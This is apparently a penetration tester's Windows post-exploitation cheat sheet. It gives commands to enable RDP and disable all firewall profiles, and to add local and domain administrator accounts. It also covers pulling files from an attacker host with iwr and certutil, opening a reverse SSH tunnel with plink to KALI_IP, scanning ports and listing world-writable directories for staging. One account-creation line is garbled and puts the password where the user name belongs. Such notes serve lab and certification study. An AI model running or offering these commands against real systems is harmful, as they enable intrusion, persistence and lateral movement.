## Enable RDP
```shell
# CMD
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall set allprofiles state off
# netsh advfirewall firewall set rule group="remote desktop" new enable=Yes


# PS
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
# Enable-NetFirewallRule -DisplayGroup "Remote Desktop"


# https://learn.microsoft.com/en-us/answers/questions/1320703/command-to-enable-remote-desktop-using-cmd
# https://www.anyviewer.com/how-to/powershell-enable-remote-desktop-0427.html
# https://www.alitajran.com/disable-windows-firewall-with-powershell/
```
## Add RDP/RMU User
```shell
net localgroup "Remote Desktop Users" /add <DOMAIN\>USER
net localgroup "Remote Management Users" /add <DOMAIN\>USER

# PS (doesn't work sometime)
# Add-LocalGroupMember -Group "Remote Desktop Users" -Member "dave2"
```
## Add user Local / Domain user
```shell
# LOCAL
net user dave2 password123 /add
net localgroup Administrators password123 /add
net user jen * # CHANGE PASSWORD

# DOMAIN
net user dave2 password123 /add /domain
net group 'Domain Admins' dave2 /add /domain
```
## Secured Credential
```shell
$Username = "DOMAIN\Username"
$Password = "Password"
$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential ($Username, $SecurePassword)
```
## iwr / certutil.exe
```shell
iwr -uri http://KALI_IP/resources/FILE -outfile FILE
certutil.exe -f -urlcache -split http://KALI_IP/FILE c:\windows\temp\FILE 
```
## Check 64 bit or not
```shell
[System.Environment]::Is64BitProcess
[Environment]::Is64BitProcess
# ps / cmd
C:\Windows\sysNative\WindowsPowerShell\v1.0\powershell.exe -NoProfile
C:\Windows\sysnative\cmd.exe
```
## Check cmd or PS
```shell
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```
## Remote Port Forward to get Local port access
```shell
cmd.exe /c echo y | C:\Windows\Temp\plink.exe -ssh -l kali -pw PASS -R 127.0.0.1:3389:127.0.0.1:3389 KALI_IP
```
## Connect to a Share
```shell
net use z: \\KALI_IP\smb [ /user:user pass ]
net use z: /delete
```
## Ctrl A + Ctrl E
```shell
Set-PSReadLineKeyHandler -Chord Ctrl-a -Function BeginningOfLine
Set-PSReadLineKeyHandler -Chord Ctrl-e -Function EndOfLine
# powershell start process as another user
```
## Schedule a task
```shell
$Action = New-ScheduledTaskAction -Execute "C:\path\to\program.exe"
$Trigger = New-ScheduledTaskTrigger -AtLogon
$Credential = Get-Credential

Register-ScheduledTask -Action $Action -Trigger $Trigger -User $Credential.UserName -Password $Credential.GetNetworkCredential().Password -TaskName "MyTask"

Start-ScheduledTask -TaskName "MyTask"
```
## Port scan from windows
```shell
# check if port is open; "True" indicates open
Test-NetConnection -Port 445 192.168.50.151

# First 1024 ports on DC example
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null
```
## World-Writable Directories
```shell
c:\windows\system32\microsoft\crypto\rsa\machinekeys
c:\windows\system32\tasks_migrated\microsoft\windows\pla\system
c:\windows\syswow64\tasks\microsoft\windows\pla\system
c:\windows\debug\wia
c:\windows\system32\tasks
c:\windows\syswow64\tasks
c:\windows\tasks
c:\windows\registration\crmlog
c:\windows\system32\com\dmp
c:\windows\system32\fxstmp
c:\windows\system32\spool\drivers\color
c:\windows\system32\spool\printers
c:\windows\system32\spool\servers
c:\windows\syswow64\com\dmp
c:\windows\syswow64\fxstmp
c:\windows\temp
c:\windows\tracing
# https://gist.github.com/mattifestation/5f9de750470c9e0e1f9c9c33f0ec3e56
```